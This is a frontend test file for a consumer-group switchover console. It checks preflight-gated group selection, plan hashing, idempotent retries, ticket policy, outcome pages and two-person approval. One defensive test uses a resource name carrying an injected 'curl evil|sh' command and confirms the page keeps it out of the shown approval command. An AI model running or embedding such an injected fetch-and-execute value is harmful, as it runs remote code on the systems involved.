// @vitest-environment jsdom
// The cutover as an operator meets it: what the review offers (only what the preflight
// admits), the one create a confirm sends and the plan bytes in it, where a refusal and
// an unknown outcome land, and what the Switched-over step and the Switchover's page
// say. The network is a fake handed to the typed client, so every request is recorded.
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { cleanup, configure, fireEvent, render, screen, waitFor, within } from "@testing-library/react";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { Outlet, RouterProvider, createMemoryHistory, createRootRoute, createRoute, createRouter } from "@tanstack/react-router";
import restoreFixture from "../../../fixtures/console/restore.json";
import sessionFixture from "../../../fixtures/console/session.json";
import { cutoverRoutes } from "./routes";
import { approvalRoutes } from "../approvals/routes";
import { SessionGate } from "../../app/SessionGate";
import { sha256 } from "../../components/hash";
import { UNKNOWN_OUTCOME, mintNames, planDocument, reviewGroups, type DetailEntry, type Preflight, type Switchover } from "../../api/switchovers";

configure({ asyncUtilTimeout: 5000 });
vi.setConfig({ testTimeout: 30_000 });

const net = vi.hoisted(() => ({
  sent: [] as { method: string; path: string; key: string | null; body: unknown }[],
  answer: null as unknown as (r: Request, path: string) => Response | Promise<Response | null> | null,
}));

vi.mock("../../mock/fetch", () => ({
  mockFetch: async (request: Request) => {
    const url = new URL(request.url);
    const path = url.pathname.replace(/^.*?\/api\/v1/, "") + url.search;
    const text = request.method === "GET" ? "" : await request.text();
    net.sent.push({ method: request.method, path, key: request.headers.get("Idempotency-Key"), body: text ? JSON.parse(text) : undefined });
    const r = await net.answer(request, path);
    if (r) return r;
    return json(404, { code: "not_found", detail: `no fake for ${request.method} ${path}`, requestId: "x" });
  },
}));

function json(status: number, body: unknown) {
  return new Response(JSON.stringify(body), { status, headers: { "content-type": status >= 400 ? "application/problem+json" : "application/json" } });
}

const sha = (c: string) => `sha256:${c.repeat(64)}`;
const RESTORE = {
  ...restoreFixture.item,
  name: "orders-recovery",
  uid: "6f1c2a3b-0000-4000-8000-000000000001",
  planHash: sha("a"),
  coverage: { requested: "complete", recorded: "complete", covered: true },
  target: { clusterRef: { name: "orders-dr" }, mode: "newTopic", originalName: false, topicPrefix: "r-" },
  operation: { state: "succeeded", stateReason: "Ok", terminal: true, verificationState: "valid", verifiedSuccess: true, exitCode: 0 },
};

const LINES: DetailEntry[] = [
  { entry: { group: "app", target: "app", admissible: true, absent: true, alreadyApplied: false, topic: "r-orders", positions: [{ partition: 0, class: "exact", committed: null, offset: 40 }, { partition: 1, class: "approximate", committed: null, offset: 12, reason: "selectionExcluded" }] } },
  { entry: { group: "gap", target: "gap", admissible: true, absent: true, alreadyApplied: false, topic: "r-orders", positions: [{ partition: 0, class: "exact", committed: null, offset: 9 }, { partition: 1, class: "unavailable", committed: null, reason: "BeforeArchive" }] } },
  { entry: { group: "live", target: "live", admissible: false, absent: false, alreadyApplied: false, type: "consumer", state: "Stable", members: 2, reason: "GroupActive", message: "the group has 2 member(s) (Stable)", topic: "r-orders", positions: [{ partition: 0, class: "exact", committed: null, offset: 41 }] } },
  { entry: { group: "moved", target: "moved", admissible: false, absent: false, alreadyApplied: false, type: "classic", state: "Empty", members: 0, reason: "TargetPositionsChanged", message: "r-orders:0 holds 50, the plan expects none", topic: "r-orders", positions: [{ partition: 0, class: "exact", committed: 50, offset: 42 }] } },
];

function review(over: Partial<Preflight> = {}, evidence: Record<string, unknown> = {}): Preflight {
  return {
    id: "pf-sw1",
    namespace: "team-a",
    uid: "u",
    resourceVersion: "1",
    operation: "switchover",
    state: "notReady",
    terminal: true,
    applicable: true,
    stale: false,
    staleBasis: ["expiry"],
    staleReasons: [],
    binding: { referents: [] },
    checks: [
      { id: "switchover.restore", state: "ready" },
      { id: "switchover.evidence", state: "ready", code: "RestoreEvidenceVerified", message: `verifies (4 group(s)) [mappingSha256=${sha("c")}; scorecardSha256=${sha("b")}]`, ...evidence },
      { id: "switchover.target", state: "ready" },
      { id: "switchover.groups", state: "notReady" },
    ] as Preflight["checks"],
    warnings: [],
    executionOnly: [],
    conditions: [],
    detailsAvailable: true,
    ...over,
  };
}

function switchover(over: Partial<Switchover> = {}): Switchover {
  return { name: "swo-1", namespace: "team-a", uid: "s-uid", approvalName: "swo-approval-x", planHash: sha("d"), restore: { name: RESTORE.name, uid: RESTORE.uid }, groups: [], phase: "Pending", reason: null, ...over };
}

interface World {
  restore?: Record<string, unknown>;
  review?: Preflight;
  lines?: DetailEntry[];
  policy?: Record<string, unknown>;
  create?: (body: Record<string, unknown>, n: number) => Response;
  switchover?: Switchover;
  request?: Record<string, unknown>;
}

const CONFIRM = { namespace: "team-a", name: "default-confirm-v1", mode: "ordinary", operatorMode: "confirm", legacy: false, basis: "freshInstall", requireDistinctPrincipal: false, ordinaryConfirmationAvailable: true, consoleApprovalAvailable: false, ticketRequired: false, installationDigest: sha("9") };

function serve(w: World) {
  let creates = 0;
  net.answer = async (r, path) => {
    const ok = (item: unknown) => json(200, { item, requestId: "r" });
    if (path === "/session") return json(200, sessionFixture);
    if (path === "/namespaces/team-a/approval-policy") return ok(w.policy ?? CONFIRM);
    if (path === "/namespaces/team-a/restores/orders-recovery") return ok(w.restore ?? RESTORE);
    if (r.method === "POST" && path === "/namespaces/team-a/preflights") return json(202, { item: w.review ?? review(), requestId: "r" });
    if (path === "/namespaces/team-a/preflights/pf-sw1") return ok(w.review ?? review());
    if (path.startsWith("/namespaces/team-a/preflights/pf-sw1/details")) return json(200, { items: w.lines ?? LINES, page: { limit: 200 }, requestId: "r" });
    if (r.method === "POST" && path === "/namespaces/team-a/switchovers") {
      creates += 1;
      return w.create ? w.create(net.sent.at(-1)!.body as Record<string, unknown>, creates) : json(201, { item: switchover(), authorization: { state: "confirmed" }, requestId: "r" });
    }
    if (path.startsWith("/namespaces/team-a/switchovers?") || path === "/namespaces/team-a/switchovers") return json(200, { items: [w.switchover ?? switchover()], page: { limit: 50 }, requestId: "r" });
    if (path === "/namespaces/team-a/switchovers/swo-1") {
      const created = net.sent.filter((s) => s.method === "POST" && s.path === "/namespaces/team-a/switchovers").at(-1)?.body as { planBytes?: string } | undefined;
      return ok(w.switchover ?? switchover(created?.planBytes ? { planBytes: created.planBytes } : {}));
    }
    if (r.method === "POST" && path === "/namespaces/team-a/switchovers/swo-1/console-approval") return json(201, { item: { name: "swo-approval-x" }, requestId: "r" });
    if (path === "/namespaces/team-a/switchovers/swo-1/approval-request") return w.request ? ok(w.request) : json(409, { code: "policy_mismatch", detail: "not two-person", requestId: "r" });
    return null;
  };
}

function renderAt(path: string) {
  const root = createRootRoute({ component: Outlet });
  const ns = createRoute({ getParentRoute: () => root, path: "$ns", component: Outlet });
  const router = createRouter({
    routeTree: root.addChildren([ns.addChildren([...cutoverRoutes(ns as never), ...approvalRoutes(ns as never)])]),
    history: createMemoryHistory({ initialEntries: [path] }),
  });
  const client = new QueryClient({ defaultOptions: { queries: { retry: false }, mutations: { retry: false } } });
  render(
    <QueryClientProvider client={client}>
      <SessionGate>{() => <RouterProvider router={router} />}</SessionGate>
    </QueryClientProvider>,
  );
  return router;
}

const FLOW = "/team-a/restores/orders-recovery/cutover";
const posts = (p: string) => net.sent.filter((s) => s.method === "POST" && s.path === p);
const include = (group: string) => screen.getByRole("checkbox", { name: `Include ${group}` }) as HTMLInputElement;
const disabled = (el: HTMLElement) => (el as HTMLButtonElement).disabled;

beforeEach(() => {
  net.sent = [];
  net.answer = () => null;
});
afterEach(cleanup);

describe("the review offers only what the preflight admits", () => {
  it("a refused group cannot be chosen; a group with an unavailable partition is offered but not chosen", async () => {
    serve({});
    renderAt(FLOW);
    await screen.findByText("4 consumer groups with mapped positions");
    expect(include("app").checked).toBe(true);
    expect(include("gap").checked).toBe(false);
    expect(include("gap").disabled).toBe(false);
    // Negative controls: the preflight refused these, so the page never offers them.
    expect(include("live").disabled).toBe(true);
    expect(include("moved").disabled).toBe(true);
    expect(disabled(screen.getByRole("button", { name: "Continue with 1 group" }))).toBe(false);
    // Choosing the group with an unavailable partition is an explicit act.
    fireEvent.click(include("gap"));
    expect(disabled(screen.getByRole("button", { name: "Continue with 2 groups" }))).toBe(false);
    expect(screen.getByText(/live still has consumers connected to orders-dr/)).toBeTruthy();
    expect(screen.getByText(/moved cannot be switched over/)).toBeTruthy();
    expect(posts("/namespaces/team-a/preflights")).toHaveLength(1);
    expect(posts("/namespaces/team-a/preflights")[0]!.body).toEqual({ operation: "switchover", switchover: { restoreName: "orders-recovery", restoreUid: RESTORE.uid } });
  });

  it("a review that no longer applies offers nothing", async () => {
    serve({ review: review({ stale: true, staleReasons: [{ reason: "expired" } as never] }) });
    renderAt(FLOW);
    await screen.findByText("The review did not decide");
    expect(screen.queryByRole("button", { name: /^Continue with/ })).toBeNull();
    expect(screen.queryByText("Ready")).toBeNull();
  });

  it("a refused review reads as a refusal, with its code and remedy", async () => {
    serve({ review: review({}, { state: "notReady", code: "RestoreEvidenceRefused", message: "VerificationNotComplete: coverage is sampled", remedy: "Restore again with coverage: complete." }) });
    renderAt(FLOW);
    await screen.findByText("The review refused this restore");
    expect(screen.getByText("RestoreEvidenceRefused")).toBeTruthy();
    expect(screen.getByText("Restore again with coverage: complete.")).toBeTruthy();
    expect(screen.queryByRole("button", { name: /^Continue with/ })).toBeNull();
  });

  it("a restore that cannot be switched over is refused from its own facts, with no review", async () => {
    serve({ restore: { ...RESTORE, coverage: { requested: "sampled", recorded: "sampled", covered: true } } });
    renderAt(FLOW);
    await screen.findByText("No positions to switch over");
    expect(screen.getByText("VerificationNotComplete")).toBeTruthy();
    expect(posts("/namespaces/team-a/preflights")).toHaveLength(0);
  });

  it("a clone is refused the same way", async () => {
    serve({ restore: { ...RESTORE, target: { ...RESTORE.target, mode: "scratch" } } });
    renderAt(FLOW);
    await screen.findByText("A clone cannot be switched over");
    expect(posts("/namespaces/team-a/preflights")).toHaveLength(0);
  });
});

describe("confirm sends one create with the plan the page showed", () => {
  async function toConfirm() {
    renderAt(FLOW);
    fireEvent.click(await screen.findByRole("button", { name: "Continue with 1 group" }));
    await screen.findByText("Undoing a switchover has limits");
    await waitFor(() => expect(screen.getAllByLabelText("switchover plan sha256").length).toBeGreaterThan(0));
  }

  it("the bytes are the plan of the chosen group, hashed, keyed and bound to the review's digests", async () => {
    serve({});
    await toConfirm();
    const button = screen.getByRole("button", { name: "Switch over 1 group" });
    // Negative control: not before the operator says the consumers stay stopped.
    expect(disabled(button)).toBe(true);
    fireEvent.click(screen.getByLabelText(/stay stopped until the switchover finishes/));
    fireEvent.click(button);
    await screen.findAllByText("Waiting for the run's result");
    const sent = posts("/namespaces/team-a/switchovers");
    expect(sent).toHaveLength(1);
    const body = sent[0]!.body as Record<string, unknown>;
    const expected = planDocument({ name: RESTORE.name, uid: RESTORE.uid, planHash: RESTORE.planHash, scorecardSha256: sha("b"), mappingSha256: sha("c") }, reviewGroups(LINES.slice(0, 1)).groups);
    expect("bytes" in expected && body.planBytes).toBe("bytes" in expected ? expected.bytes : "");
    expect(body.planHash).toBe(await sha256(body.planBytes as string));
    expect(body.restoreRef).toEqual({ name: RESTORE.name, uid: RESTORE.uid });
    expect(body.deadlineSeconds).toBe(900);
    expect(body).not.toHaveProperty("ticket");
    expect(sent[0]!.key).toBe(mintNames(body.planHash as string, "r1-pf-sw1").key);
    expect((body.approvalRef as { name: string }).name).toBe(mintNames(body.planHash as string, "r1-pf-sw1").approvalName);
    expect(body.planBytes).not.toContain("gap");
  });

  it("a default group the operator unticks stays out of the plan", async () => {
    serve({});
    renderAt(FLOW);
    await screen.findByText("4 consumer groups with mapped positions");
    expect(include("app").checked).toBe(true);
    fireEvent.click(include("app"));
    expect(include("app").checked).toBe(false);
    expect(screen.queryByRole("button", { name: /^Continue with/ })?.textContent ?? "").toMatch(/0 groups|^$/);
    fireEvent.click(include("gap"));
    // Control: a group the operator ticks is in; the unticked default stays out.
    expect(include("gap").checked).toBe(true);
    expect(include("app").checked).toBe(false);
    fireEvent.click(screen.getByRole("button", { name: "Continue with 1 group" }));
    await screen.findByText("Undoing a switchover has limits");
    fireEvent.click(screen.getByLabelText(/stay stopped until the switchover finishes/));
    fireEvent.click(screen.getByRole("button", { name: "Switch over 1 group" }));
    await screen.findAllByText("Waiting for the run's result");
    const body = posts("/namespaces/team-a/switchovers")[0]!.body as { planBytes: string };
    expect(body.planBytes).toContain('"gap"');
    expect(body.planBytes).not.toContain('"app"');
  });

  it("an unknown outcome says so, and submitting again carries the same key and bytes", async () => {
    serve({ create: (_b, n) => (n === 1 ? json(503, { code: "upstream_timeout", detail: "the API server did not answer", requestId: "q" }) : json(200, { item: switchover(), replayed: true, requestId: "r" })) });
    await toConfirm();
    fireEvent.click(screen.getByLabelText(/stay stopped until the switchover finishes/));
    fireEvent.click(screen.getByRole("button", { name: "Switch over 1 group" }));
    await screen.findByText(UNKNOWN_OUTCOME);
    fireEvent.click(screen.getByRole("button", { name: "Submit again" }));
    await screen.findAllByText("Waiting for the run's result");
    const sent = posts("/namespaces/team-a/switchovers");
    expect(sent).toHaveLength(2);
    expect(sent[1]!.key).toBe(sent[0]!.key);
    expect((sent[1]!.body as { planBytes: string }).planBytes).toBe((sent[0]!.body as { planBytes: string }).planBytes);
  });

  it("a field refusal lands next to its field, and nothing moves on", async () => {
    const twoPerson = { ...CONFIRM, name: "prod-pair", mode: "governed", operatorMode: "two-person", consoleApprovalAvailable: true, ordinaryConfirmationAvailable: false, ticketRequired: false };
    serve({ policy: twoPerson, create: () => json(422, { code: "validation_failed", detail: "One or more fields are invalid.", errors: [{ field: "ticket", code: "required", message: "a change ticket is required by this namespace's policy" }], requestId: "q" }) });
    await toConfirm();
    fireEvent.click(screen.getByLabelText(/stay stopped until the switchover finishes/));
    fireEvent.click(await screen.findByRole("button", { name: "Request a switchover of 1 group" }));
    await screen.findByText("a change ticket is required by this namespace's policy");
    expect(screen.getByLabelText(/Change ticket/).getAttribute("aria-invalid")).toBe("true");
    expect(screen.queryByText("Waiting for the run's result")).toBeNull();
  });

  it("a namespace whose policy needs a ticket refuses the click without one, before any request", async () => {
    serve({ policy: { ...CONFIRM, operatorMode: "strict", mode: "governed", ordinaryConfirmationAvailable: false, ticketRequired: true } });
    await toConfirm();
    fireEvent.click(screen.getByLabelText(/stay stopped until the switchover finishes/));
    fireEvent.click(await screen.findByRole("button", { name: "Request a switchover of 1 group" }));
    await screen.findByText("This namespace's policy requires a change ticket.");
    expect(posts("/namespaces/team-a/switchovers")).toHaveLength(0);
    // Negative control: with a ticket the same click sends it.
    fireEvent.change(screen.getByLabelText(/Change ticket/), { target: { value: "CHG-1" } });
    fireEvent.click(screen.getByRole("button", { name: "Request a switchover of 1 group" }));
    await waitFor(() => expect(posts("/namespaces/team-a/switchovers")).toHaveLength(1));
    expect((posts("/namespaces/team-a/switchovers")[0]!.body as { ticket: string }).ticket).toBe("CHG-1");
  });
});

describe("switched over", () => {
  it("a partial application names each group's outcome and what undoing takes", async () => {
    serve({
      switchover: switchover({
        phase: "PartiallyApplied",
        reason: "PartiallyApplied",
        exitCode: 2,
        recordKey: "logweir/switchovers/RUN.record.json",
        groups: [
          { source: "app", target: "app", outcome: "applied", created: true, partitions: 2 },
          { source: "live", target: "live", outcome: "refused", reason: "GroupActive", created: false, partitions: 1 },
          { source: "moved", target: "moved", outcome: "refused", reason: "TargetPositionsChanged", created: false, partitions: 1 },
        ],
      }),
    });
    renderAt(`${FLOW}?switchover=swo-1`);
    await screen.findByText("Partially applied", { selector: ".pf-v6-c-label__text" });
    const table = screen.getByRole("grid", { name: "Outcome per group" }) ?? screen.getByLabelText("Outcome per group");
    expect(within(table).getAllByText("Refused")).toHaveLength(2);
    expect(within(table).getByText("GroupActive")).toBeTruthy();
    expect(within(table).getByText("TargetPositionsChanged")).toBeTruthy();
    expect(within(table).getByText("Applied")).toBeTruthy();
    expect(screen.getByText("2 groups not switched over")).toBeTruthy();
    expect(screen.getByText("Undoing this switchover")).toBeTruthy();
    expect(screen.getByRole("button", { name: "Download the rollback steps" })).toBeTruthy();
    // A rollback is shown, never started: no button creates one.
    expect(screen.queryByRole("button", { name: /^Roll back/ })).toBeNull();
  });

  it("a whole-run refusal reads as a refusal and commits nothing", async () => {
    serve({ switchover: switchover({ phase: "Refused", reason: "TargetGenerationChanged", exitCode: 3 }) });
    renderAt(`${FLOW}?switchover=swo-1`);
    await screen.findByText("Refused: TargetGenerationChanged");
    expect(screen.getByText(/deleted and created again since the restore created it/)).toBeTruthy();
    expect(screen.getByText("Refused before any group: nothing was committed.")).toBeTruthy();
    expect(screen.queryByText("Undoing this switchover")).toBeNull();
  });

  it("a held switchover says what it waits for, not that it runs", async () => {
    serve({ switchover: switchover({ phase: "Pending", reason: "ApprovalNotVerified" }), policy: { ...CONFIRM, operatorMode: "two-person", consoleApprovalAvailable: true } });
    renderAt(`${FLOW}?switchover=swo-1`);
    await screen.findAllByText("Waiting for approval");
    expect(screen.queryByText("Running")).toBeNull();
    expect(screen.queryByText(/Start your consumers/)).toBeNull();
  });
});

describe("the Switchover's page", () => {
  const LEGACY = { ...CONFIRM, name: "legacy-governed-v1", legacy: true, mode: "governed", operatorMode: "strict", ordinaryConfirmationAvailable: false };
  it("the approval command names the plan file only when the name is a plain object name", async () => {
    serve({ policy: LEGACY, switchover: switchover({ name: "swo-1", phase: "Pending", reason: "ApprovalNotVerified" }) });
    renderAt("/team-a/switchovers/swo-1");
    await screen.findByText(/--spec 'swo-1.switchover-plan.yaml'/);
    cleanup();
    serve({ policy: LEGACY, switchover: switchover({ name: "swo-1;curl evil|sh", phase: "Pending", reason: "ApprovalNotVerified" }) });
    renderAt("/team-a/switchovers/swo-1");
    await screen.findByText(/--spec <the downloaded plan>/);
    expect(screen.queryByText(/curl evil/, { selector: "code, pre" })).toBeNull();
  });
});

describe("the switchover's approval (R6's Approvals, subject kind Switchover)", () => {
  const REQUEST = {
    switchover: "swo-1",
    switchoverUid: "s-uid",
    namespace: "team-a",
    approvalName: "swo-approval-x",
    confirmationName: "swo-approval-x-confirmation",
    confirmationSha256: sha("e"),
    policy: "prod-pair",
    policyDigest: sha("f"),
    planHash: sha("d"),
    state: "pending",
    stateSentence: "Waiting for a second person to approve.",
    approve: { offered: true, sentence: "Approving lets the controller run this switchover." },
    scopeComplete: true,
    scope: {
      restore: { name: "orders-recovery", uid: "r-uid", planHash: sha("a"), scorecardSha256: sha("b"), mappingSha256: sha("c") },
      groupsCount: 1,
      positionsCount: 1,
      groups: [{ source: "app", target: "app", topics: [{ topic: "r-orders", positions: [{ partition: 0, offset: 1200, approximate: false }] }] }],
    },
  };
  it("shows every position, and one click sends only the hash of what was shown", async () => {
    serve({ request: REQUEST });
    renderAt("/team-a/approvals/switchover/swo-1");
    await screen.findByRole("grid", { name: "Positions of app" });
    fireEvent.click(screen.getByRole("button", { name: "Approve" }));
    await screen.findByText("Approved");
    const sent = posts("/namespaces/team-a/switchovers/swo-1/console-approval");
    expect(sent).toHaveLength(1);
    expect(sent[0]!.body).toEqual({ confirmationSha256: sha("e") });
  });
  it("a request this login may not approve shows why, with no button (negative control)", async () => {
    serve({ request: { ...REQUEST, approve: { offered: false, refusal: "requester", sentence: "You asked for this switchover; a second person approves it." } } });
    renderAt("/team-a/approvals/switchover/swo-1");
    await screen.findByText("You cannot approve your own request");
    expect(screen.queryByRole("button", { name: "Approve" })).toBeNull();
    expect(posts("/namespaces/team-a/switchovers/swo-1/console-approval")).toHaveLength(0);
  });
});
